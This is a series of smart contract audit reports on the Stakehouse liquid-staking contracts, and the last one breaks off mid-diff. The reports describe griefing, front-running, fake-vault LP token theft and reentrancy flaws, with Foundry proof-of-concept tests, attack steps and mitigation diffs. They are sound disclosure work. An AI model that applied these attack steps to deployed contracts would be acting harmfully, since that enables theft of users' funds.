# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/ETHPoolLPFactory.sol#L111   # Vulnerability details  ## Description  Interaction with SavETHVault and StakingFundsVault require a minimum amount of MIN_STAKING_AMOUNT. In order to be used for staking, there needs to be 24 ETH or 4 ETH for the desired BLS public key in those vaults. The issue is that vaults can be griefed and made impossible to use for depositing by constantly making sure the *remaining* amount to be added to complete the deposit to the maxStakingAmountPerValidator, is under MIN_STAKING_AMOUNT.  In \_depositETHForStaking: ``` function _depositETHForStaking(bytes calldata _blsPublicKeyOfKnot, uint256 _amount, bool _enableTransferHook) internal {     require(_amount >= MIN_STAKING_AMOUNT, "Min amount not reached");     require(_blsPublicKeyOfKnot.length == 48, "Invalid BLS public key");     // LP token issued for the KNOT     // will be zero for a new KNOT because the mapping doesn't exist     LPToken lpToken = lpTokenForKnot[_blsPublicKeyOfKnot];     if(address(lpToken) != address(0)) {         // KNOT and it's LP token is already registered         // mint the respective LP tokens for the user         // total supply after minting the LP token must not exceed maximum staking amount per validator         require(lpToken.totalSupply() + _amount <= maxStakingAmountPerValidator, "Amount exceeds the staking limit for the validator");         // mint LP tokens for the depoistor with 1:1 ratio of LP tokens and ETH supplied         lpToken.mint(msg.sender, _amount);         emit LPTokenMinted(_blsPublicKeyOfKnot, address(lpToken), msg.sender, _amount);     }     else {           // check that amount doesn't exceed max staking amount per validator         require(_amount <= maxStakingAmountPerValidator, "Amount exceeds the staking limit for the validator");     ...      ```   MED - Can grief vaults (SavETHVault, StakingFundsVault) and make them not able to be used for staking by depositing so that left to stake is < MIN_STAKING_AMOUNT. Then it will fail maxStakingAmount check @ _depositEthForStaking  ## Impact  Vaults can be griefed to not be able to be used for deposits  ## Proof of Concept  1. savETHVault has 22 ETH for some validator 2. Attacker deposits 1.9991 ETH to the savETHVault 3. vault now has 23.9991 ETH. The remaining to complete to 24 is 0.0009 ETH which is under 0.001 ether, min staking amount 4. No one can complete the staking  Note that depositers may try to remove their ETH and redeposit it to complete the deposit to 24. However attack may still keep the delta just under MIN_STAKING_AMOUNT.  ## Tools Used  Manual audit  ## Recommended Mitigation Steps  Handle the case where the remaining amount to be completed is smaller than MIN_STAKING_AMOUNT, and allow the deposit in that case.
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L224   # Vulnerability details  ## Description  StakingFundsVault has the claimRewards() function to allow users to withdraw profits.  ``` function claimRewards(     address _recipient,     bytes[] calldata _blsPubKeys ) external nonReentrant {     for (uint256 i; i < _blsPubKeys.length; ++i) {         require(             liquidStakingNetworkManager.isBLSPublicKeyBanned(_blsPubKeys[i]) == false,             "Unknown BLS public key"         );         // Ensure that the BLS key has its derivatives minted         require(             getAccountManager().blsPublicKeyToLifecycleStatus(_blsPubKeys[i]) == IDataStructures.LifecycleStatus.TOKENS_MINTED,             "Derivatives not minted"         );         if (i == 0 && !Syndicate(payable(liquidStakingNetworkManager.syndicate())).isNoLongerPartOfSyndicate(_blsPubKeys[i])) {             // Withdraw any ETH accrued on free floating SLOT from syndicate to this contract             // If a partial list of BLS keys that have free floating staked are supplied, then partial funds accrued will be fetched             _claimFundsFromSyndicateForDistribution(                 liquidStakingNetworkManager.syndicate(),                 _blsPubKeys             );             // Distribute ETH per LP             updateAccumulatedETHPerLP();         }         // If msg.sender has a balance for the LP token associated with the BLS key, then send them any accrued ETH         LPToken token = lpTokenForKnot[_blsPubKeys[i]];         require(address(token) != address(0), "Invalid BLS key");         require(token.lastInteractedTimestamp(msg.sender) + 30 minutes < block.timestamp, "Last transfer too recent");         _distributeETHRewardsToUserForToken(msg.sender, address(token), token.balanceOf(msg.sender), _recipient);     } } ```  The issue is that updateAccumulatedETHPerLP() is not guaranteed to be called, which means the ETH reward distribution in \_distribute would use stale value, and users will not receive as many rewards as they should. `updateAccumulatedETHPerLP` is only called if the first BLS public key is part of the syndicate. However, for the other keys it makes no reason not to use the up to date accumulatedETHPerLPShare value.  ## Impact  User receives less rewards than they are eligible for if first passed BLS key is inactive.  ## Tools Used  Manual audit  ## Recommended Mitigation Steps  Call updateAccumulatedETHPerLP() at the start of the function.
# Lines of code   https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L218   # Vulnerability details  ## Description  claimRewards in StakingFundsVault.sol has this code: ``` if (i == 0 && !Syndicate(payable(liquidStakingNetworkManager.syndicate())).isNoLongerPartOfSyndicate(_blsPubKeys[i])) {     // Withdraw any ETH accrued on free floating SLOT from syndicate to this contract     // If a partial list of BLS keys that have free floating staked are supplied, then partial funds accrued will be fetched     _claimFundsFromSyndicateForDistribution(         liquidStakingNetworkManager.syndicate(),         _blsPubKeys     );     // Distribute ETH per LP     updateAccumulatedETHPerLP(); } ```  The issue is that if the first BLS public key is not part of the syndicate, then \_claimFundsFromSyndicateForDistribution will not be called, even on BLS keys that are eligible for syndicate rewards. This leads to reduced rewards for user.  This is different from a second bug which discusses the possibility of using a stale acculmulatedETHPerLP.  ## Impact  Users will not receive rewards for claims of valid public keys if first passed key is not part of syndicate.  ## Tools Used  Manual audit  ## Recommended Mitigation Steps  Drop the i==0 requirement, which was intended to make sure the claim isn't called multiple times. Use a hasClaimed boolean instead.
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L356 https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L369   # Vulnerability details  ## Impact As the `rotateNodeRunnerOfSmartWallet` function can be called by anyone who is a node runner in the LSD network, this function is vulnerable to a frontrun attack in the case of this node runner being malicious.  ## Proof of Concept If that is the current node runner is malicious, the DAO would purposely call this same `rotateNodeRunnerOfSmartWallet` with the `_wasPreviousNodeRunnerMalicious` flag turned on. An actual node runner that has been malicious could monitor the mempool and frontrun the DAO transaction that wanted to slash it and submit the transaction before the DAO to avoid getting banned and rotate their EOA representation of the node.  ```solidity if (msg.sender == dao && _wasPreviousNodeRunnerMalicious) {     bannedNodeRunners[_current] = true;     emit NodeRunnerBanned(_current); } ```  When the DAO transaction would go through, it would revert when it's checking if the current (old) node representative is still a wallet, but it's not because the mapping value has been deleted before.  ```solidity address wallet = smartWalletOfNodeRunner[_current]; require(wallet != address(0), "Wallet does not exist"); ```  ## Tools Used Manual inspection  ## Recommended Mitigation Steps Restrict this function to DAO only with the `onlyDAO` modifier.  ```solidity // - function rotateNodeRunnerOfSmartWallet(address _current, address _new, bool _wasPreviousNodeRunnerMalicious) external { + function rotateNodeRunnerOfSmartWallet(address _current, address _new, bool _wasPreviousNodeRunnerMalicious) onlyDAO external {     require(_new != address(0) && _current != _new, "New is zero or current");      address wallet = smartWalletOfNodeRunner[_current];     require(wallet != address(0), "Wallet does not exist");     require(_current == msg.sender || dao == msg.sender, "Not current owner or DAO");      address newRunnerCurrentWallet = smartWalletOfNodeRunner[_new];     require(newRunnerCurrentWallet == address(0), "New runner has a wallet");      smartWalletOfNodeRunner[_new] = wallet;     nodeRunnerOfSmartWallet[wallet] = _new;      delete smartWalletOfNodeRunner[_current];      // - if (msg.sender == dao && _wasPreviousNodeRunnerMalicious) {     if (_wasPreviousNodeRunnerMalicious) {         bannedNodeRunners[_current] = true;         emit NodeRunnerBanned(_current);     }      emit NodeRunnerOfSmartWalletRotated(wallet, _current, _new); }
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L93-L97   # Vulnerability details  ## Impact The batch operations of `withdrawDETH()` in GiantSavETHVaultPool.sol and `withdrawLPTokens()` in GiantPoolBase.sol are meaningless because they will fail whenever more than one lpToken is passed. Each user can perform `withdrawDETH()` or `withdrawLPTokens()` with one LPToken only once a day.  ## Proof of Concept  Both the `withdrawDETH()` in GiantSavETHVaultPool.sol and `withdrawLPTokens()` in GiantPoolBase.sol will call `GiantPoolBase._assertUserHasEnoughGiantLPToClaimVaultLP(lpToken, amount)` and `lpTokenETH.burn(msg.sender, amount)`:  There is a require in `_assertUserHasEnoughGiantLPToClaimVaultLP()`: ``` require(lpTokenETH.lastInteractedTimestamp(msg.sender) + 1 days < block.timestamp, "Too new"); ```  At the same time, `lpTokenETH.burn(msg.sender, amount)` will update `lastInteractedTimestamp[msg.sender]` to latest block timestamp in `_afterTokenTransfer()` of GiantLP.sol.  So, a user can perform `withdrawDETH` or `withdrawLPTokens` of one LPToken only once a day, others more will fail by `_assertUserHasEnoughGiantLPToClaimVaultLP()`.  ## Tools Used VS Code  ## Recommended Mitigation Steps  The LPToken being operated on should be checked for lastInteractedTimestamp rather than lpTokenETH.  ``` diff --git a/contracts/liquid-staking/GiantPoolBase.sol b/contracts/liquid-staking/GiantPoolBase.sol index 8a8ff70..5c009d9 100644 --- a/contracts/liquid-staking/GiantPoolBase.sol +++ b/contracts/liquid-staking/GiantPoolBase.sol @@ -93,7 +93,7 @@ contract GiantPoolBase is ReentrancyGuard {      function _assertUserHasEnoughGiantLPToClaimVaultLP(LPToken _token, uint256 _amount) internal view {          require(_amount >= MIN_STAKING_AMOUNT, "Invalid amount");          require(_token.balanceOf(address(this)) >= _amount, "Pool does not own specified LP"); -        require(lpTokenETH.lastInteractedTimestamp(msg.sender) + 1 days < block.timestamp, "Too new"); +        require(_token.lastInteractedTimestamp(msg.sender) + 1 days < block.timestamp, "Too new");      }       /// @dev Allow an inheriting contract to have a hook for performing operations post depositing ETH ```  
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L356-L377 https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L507-L509 https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L426-L492   # Vulnerability details  ## Impact Currently, the `rotateNodeRunnerOfSmartWallet` function provides the only way to set `bannedNodeRunners` to `true` for a malicious node runner. However, before the node runner calls the `registerBLSPublicKeys` function to create a smart wallet, calling the `rotateNodeRunnerOfSmartWallet` function reverts. This means that for a node runner, who is already known to be malicious such as someone controlling a hacker address, calling the `isNodeRunnerBanned` function always return `false` before the `registerBLSPublicKeys` function is called for the first time, and executing `require(isNodeRunnerBanned(msg.sender) == false, "Node runner is banned from LSD network")` when calling the `registerBLSPublicKeys` function for the first time is not effective. As the monitoring burden can be high, the malicious node runner could interact with the protocol maliciously for a while already after the `registerBLSPublicKeys` function is called until the DAO notices the malicious activities and then calls the `rotateNodeRunnerOfSmartWallet` function. When the DAO does not react promptly, some damages to the protocol could be done already.  https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L356-L377 ```solidity     function rotateNodeRunnerOfSmartWallet(address _current, address _new, bool _wasPreviousNodeRunnerMalicious) external {         ...          if (msg.sender == dao && _wasPreviousNodeRunnerMalicious) {             bannedNodeRunners[_current] = true;             emit NodeRunnerBanned(_current);         }          ...     } ```  https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L507-L509 ```solidity     function isNodeRunnerBanned(address _nodeRunner) public view returns (bool) {         return bannedNodeRunners[_nodeRunner];     } ```  https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L426-L492 ```solidity     function registerBLSPublicKeys(         bytes[] calldata _blsPublicKeys,         bytes[] calldata _blsSignatures,         address _eoaRepresentative     ) external payable nonReentrant {         ...         require(isNodeRunnerBanned(msg.sender) == false, "Node runner is banned from LSD network");          address smartWallet = smartWalletOfNodeRunner[msg.sender];          if(smartWallet == address(0)) {             // create new wallet owned by liquid staking manager             smartWallet = smartWalletFactory.createWallet(address(this));             emit SmartWalletCreated(smartWallet, msg.sender);              // associate node runner with the newly created wallet             smartWalletOfNodeRunner[msg.sender] = smartWallet;             nodeRunnerOfSmartWallet[smartWallet] = msg.sender;              _authorizeRepresentative(smartWallet, _eoaRepresentative, true);         }          ...     } ```  ## Proof of Concept Please add the following test in `test\foundry\LSDNFactory.t.sol`. This test will pass to demonstrate the described scenario. ```solidity     function testMaliciousNodeRunnerCannotBeBannedBeforeCorrespondingSmartWalletIsCreated() public {         vm.prank(address(factory));         manager.updateDAOAddress(admin);          // Simulate a situation where accountOne is known to be malicious already.         // accountOne is not banned at this moment.         assertEq(manager.bannedNodeRunners(accountOne), false);          // Calling the rotateNodeRunnerOfSmartWallet function is the only way to ban accountOne;         //   however, calling it reverts because accountOne has not called the registerBLSPublicKeys function to create a smart wallet yet.         // This means that it is not possible to prevent accountOne from interacting with the protocol until her or his smart wallet is created.         vm.prank(admin);         vm.expectRevert("Wallet does not exist");         manager.rotateNodeRunnerOfSmartWallet(accountOne, accountTwo, true);     } ```  ## Tools Used VSCode  ## Recommended Mitigation Steps A function, which should be only callable by the DAO, that can directly set `bannedNodeRunners` for a node runner can be added.
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L278-L284 https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L684-L692 https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L426-L492   # Vulnerability details  ## Impact Calling the `updateNodeRunnerWhitelistStatus` function by the DAO supposes to allow the trusted node runners to use and interact with the protocol when `enableWhitelisting` is set to `true`. However, since calling the `updateNodeRunnerWhitelistStatus` function executes `require(isNodeRunnerWhitelisted[_nodeRunner] != isNodeRunnerWhitelisted[_nodeRunner], "Unnecessary update to same status")`, which always reverts, the DAO is unable to whitelist any trusted node runners. Because none of them can be whitelisted, all trusted node runners cannot call functions like `registerBLSPublicKeys` when the whitelisting mode is enabled. As the major functionalities become unavailable, the protocol's usability becomes much limited, and the user experience becomes much degraded.  https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L278-L284 ```solidity     function updateNodeRunnerWhitelistStatus(address _nodeRunner, bool isWhitelisted) external onlyDAO {         require(_nodeRunner != address(0), "Zero address");         require(isNodeRunnerWhitelisted[_nodeRunner] != isNodeRunnerWhitelisted[_nodeRunner], "Unnecessary update to same status");          isNodeRunnerWhitelisted[_nodeRunner] = isWhitelisted;         emit NodeRunnerWhitelistingStatusChanged(_nodeRunner, isWhitelisted);     } ```  https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L684-L692 ```solidity     function _isNodeRunnerValid(address _nodeRunner) internal view returns (bool) {         require(_nodeRunner != address(0), "Zero address");          if(enableWhitelisting) {             require(isNodeRunnerWhitelisted[_nodeRunner] == true, "Invalid node runner");         }          return true;     } ```  https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L426-L492 ```solidity     function registerBLSPublicKeys(         bytes[] calldata _blsPublicKeys,         bytes[] calldata _blsSignatures,         address _eoaRepresentative     ) external payable nonReentrant {         ...         require(_isNodeRunnerValid(msg.sender) == true, "Unrecognised node runner");         ...     } ```  ## Proof of Concept Please add the following test in `test\foundry\LSDNFactory.t.sol`. This test will pass to demonstrate the described scenario. ```solidity     function testCallingUpdateNodeRunnerWhitelistStatusFunctionAlwaysReverts() public {         vm.prank(address(factory));         manager.updateDAOAddress(admin);          vm.startPrank(admin);          vm.expectRevert("Unnecessary update to same status");         manager.updateNodeRunnerWhitelistStatus(accountOne, true);          vm.expectRevert("Unnecessary update to same status");         manager.updateNodeRunnerWhitelistStatus(accountTwo, false);          vm.stopPrank();     } ```  ## Tools Used VSCode  ## Recommended Mitigation Steps https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L280 can be updated to the following code.  ```solidity         require(isNodeRunnerWhitelisted[_nodeRunner] != isWhitelisted, "Unnecessary update to same status"); ```
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L202-L215 https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/smart-wallet/OwnableSmartWallet.sol#L52-L64   # Vulnerability details  ## Impact Calling the `executeAsSmartWallet` function by the DAO further calls the `OwnableSmartWallet.execute` function. Since the `executeAsSmartWallet` function is `payable`, an ETH amount can be sent when calling it. However, since the sent ETH amount is not forwarded to the smart wallet contract, such sent amount can become locked in the `LiquidStakingManager` contract. For example, when the DAO attempts to call the `executeAsSmartWallet` function for sending some ETH to the smart wallet so the smart wallet can use it when calling its `execute` function, if the smart wallet's ETH balance is also higher than this sent ETH amount, calling the `executeAsSmartWallet` function would not revert, and the sent ETH amount is locked in the `LiquidStakingManager` contract while such amount is deducted from the smart wallet's ETH balance for being sent to the target address. Besides that this is against the intention of the DAO, the DAO loses the sent ETH amount that becomes locked in the `LiquidStakingManager` contract, and the node runner loses the amount that is unexpectedly deducted from the corresponding smart wallet's ETH balance.  https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L202-L215 ```solidity     function executeAsSmartWallet(         address _nodeRunner,         address _to,         bytes calldata _data,         uint256 _value     ) external payable onlyDAO {         address smartWallet = smartWalletOfNodeRunner[_nodeRunner];         require(smartWallet != address(0), "No wallet found");         IOwnableSmartWallet(smartWallet).execute(             _to,             _data,             _value         );     } ```  https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/smart-wallet/OwnableSmartWallet.sol#L52-L64 ```solidity     function execute(         address target,         bytes memory callData,         uint256 value     )         external         override         payable         onlyOwner // F: [OSW-6A]         returns (bytes memory)     {         return target.functionCallWithValue(callData, value); // F: [OSW-6]     } ```  ## Proof of Concept Please add the following code in `test\foundry\LSDNFactory.t.sol`.  1. Add the following `receive` function for the POC purpose. ```solidity     receive() external payable {} ```  2. Add the following test. This test will pass to demonstrate the described scenario. ```solidity     function testETHSentWhenCallingExecuteAsSmartWalletFunctionCanBeLost() public {         vm.prank(address(factory));         manager.updateDAOAddress(admin);          uint256 nodeStakeAmount = 4 ether;         address nodeRunner = accountOne;         vm.deal(nodeRunner, nodeStakeAmount);          address eoaRepresentative = accountTwo;          vm.prank(nodeRunner);         manager.registerBLSPublicKeys{value: nodeStakeAmount}(             getBytesArrayFromBytes(blsPubKeyOne),             getBytesArrayFromBytes(blsPubKeyOne),             eoaRepresentative         );          // Before the executeAsSmartWallet function is called, the manager contract owns 0 ETH,         //   and nodeRunner's smart wallet owns 4 ETH.          assertEq(address(manager).balance, 0);         assertEq(manager.smartWalletOfNodeRunner(nodeRunner).balance, 4 ether);          uint256 amount = 1.5 ether;          vm.deal(admin, amount);          vm.startPrank(admin);          // admin, who is dao at this moment, calls the executeAsSmartWallet function while sending 1.5 ETH         manager.executeAsSmartWallet{value: amount}(nodeRunner, address(this), bytes(""), amount);          vm.stopPrank();          // Although admin attempts to send the 1.5 ETH through calling the executeAsSmartWallet function,         //   the sent 1.5 ETH was not transferred to nodeRunner's smart wallet but is locked in the manager contract instead.         assertEq(address(manager).balance, amount);          // Because nodeRunner's smart wallet owns more than 1.5 ETH, 1.5 ETH of this smart wallet's ETH balance is actually sent to address(this).         assertEq(manager.smartWalletOfNodeRunner(nodeRunner).balance, 4 ether - amount);     } ```  ## Tools Used VSCode  ## Recommended Mitigation Steps https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L210-L214 can be updated to the following code.  ```solidity         IOwnableSmartWallet(smartWallet).execute{value: msg.value}(             _to,             _data,             _value         ); ```
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L126   # Vulnerability details  ## Impact real `LPTokens` can be transferred out of `GiantMevAndFeesPool` through fake `_stakingFundsVaults` provided by an attacker. https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L126  ## Proof of Concept `bringUnusedETHBackIntoGiantPool` takes in `_stakingFundsVaults`, `_oldLPTokens`, `_newLPTokens` and rotate `_amounts` from old to new tokens. The tokens are thoroughly verified by `burnLPForETH` in `ETHPoolLPFactory`.  However, theres is no checking for the validity of `_stakingFundsVaults`, nor the relationship between `LPTokens` and `_stakingFundsVaults`. Therefore, an attacker can create fake contracts for `_stakingFundsVaults`, with `burnLPTokensForETH`, that takes `LPTokens` as parameters. The `msg.sender` in `burnLPTokensForETH` is `GiantMevAndFeesPool`, thus the attacker can transfer `LPTokens` that belongs to `GiantMevAndFeesPool` to any addresses it controls.  ## Tools Used manual  ## Recommended Mitigation Steps Always passing liquid staking manager address, checking its real and then requesting either the savETH vault or staking funds vault is a good idea to prove the validity of vaults.  
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L51-L73 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L146-L167 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L66-L90 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L66-L104 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L110-L143 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L314-L340   # Vulnerability details  ### Author: rotcivegaf  ### Impact  The root of the problem are in the `_distributeETHRewardsToUserForToken` who makes a call to distribute the ether rewards. With this call the recipient can execute an reentrancy attack calling several times the different function to steal founds or take advantage of other users/protocol  ### Proof of Concept  This functions use the `_distributeETHRewardsToUserForToken`:  #### [`beforeTokenTransfer`, **GiantMevAndFeesPool** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L146-L167):  The contract **GiantLP** use the **GiantMevAndFeesPool** contract as [`transferHookProcessor`](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantLP.sol#L14) and when use the functions [`_mint`, `_burn`, `transferFrom` and `transfer` of the ERC20](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.7/contracts/token/ERC20/ERC20.sol), the function [`beforeTokenTransfer`](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L146-L167) implemented in the **GiantMevAndFeesPool** bring a possibility to make a reentrancy attack because in the function [`_distributeETHRewardsToUserForToken`](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L51-L73) implemented in the [**GiantMevAndFeesPool** make a `call` to the `_recipient`](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L67-L68)  A contract can call the function `transfer` of **GiantLP** contract several time, transfer an `amount` from and to self, as the update of the [`claimed`](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L203) would not be done until, it is executed the function [`_afterTokenTransfer`](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantLP.sol#L43-L47) of the **GiantLP** contract, the [`due`](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L61) amount calculated in `_distributeETHRewardsToUserForToken` of **SyndicateRewardsProcessor** contract and the `lastInteractedTimestamp` of **GiantLP** contract will be incorrect  ### [`withdrawLPTokens`, **GiantPoolBase** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L66-L90):  The possibility of the reentrancy is given when call function [`_onWithdraw`](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L74), this function implemented in [**GiantMevAndFeesPool** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L181-L193) uses `_distributeETHRewardsToUserForToken` and this one call the recipient making the possibility of the reentrancy, breaking the code of [L76-L89](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L76-L89)  ### [`batchDepositETHForStaking`, **StakingFundsVault** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L66-L104):  The possibility of the reentrancy is given when call function [`_distributeETHRewardsToUserForToken`](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L88-L93), this function call the recipient making the possibility of the reentrancy, breaking the code of [L76-L89](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L96-L107)  ### [`depositETHForStaking`, **StakingFundsVault** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L110-L143):  The possibility of the reentrancy is given when call function [`_distributeETHRewardsToUserForToken`](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L128-L133), this function call the recipient making the possibility of the reentrancy, breaking the code of [L136-L142](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L136-L142)  ### [`beforeTokenTransfer`, **StakingFundsVault** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L314-L340):  The possibility of the reentrancy is given when call function `_distributeETHRewardsToUserForToken` in [L333](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L333) and [L337](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L337), this function call the recipient making the possibility of the reentrancy, breaking the code of [L343-L351](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L343-L351)  ### Tools Used  Review  ### Recommended Mitigation Steps  One possibility its wrap(`deposit`) ether in WETH and transfer as ERC20 token  Another, it's add `nonReentrant` guard to the functions: - [`beforeTokenTransfer`, **GiantMevAndFeesPool** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L146-L167) - [`withdrawLPTokens`, **GiantPoolBase** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L66-L90) - [`batchDepositETHForStaking`, **StakingFundsVault** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L66-L104) - [`depositETHForStaking`, **StakingFundsVault** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L110-L143) - [`beforeTokenTransfer`, **StakingFundsVault** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L314-L340)  ```diff File: contracts/liquid-staking/GiantMevAndFeesPool.sol  @@ -143,7 +143,7 @@ contract GiantMevAndFeesPool is ITransferHookProcessor, GiantPoolBase, Syndicate      }       /// @notice Allow giant LP token to notify pool about transfers so the claimed amounts can be processed -    function beforeTokenTransfer(address _from, address _to, uint256) external { +    function beforeTokenTransfer(address _from, address _to, uint256) external nonReentrant {          require(msg.sender == address(lpTokenETH), "Caller is not giant LP");          updateAccumulatedETHPerLP(); ```  ```diff File: contracts/liquid-staking/GiantPoolBase.sol  @@ -66,7 +66,7 @@ contract GiantPoolBase is ReentrancyGuard {      /// @notice 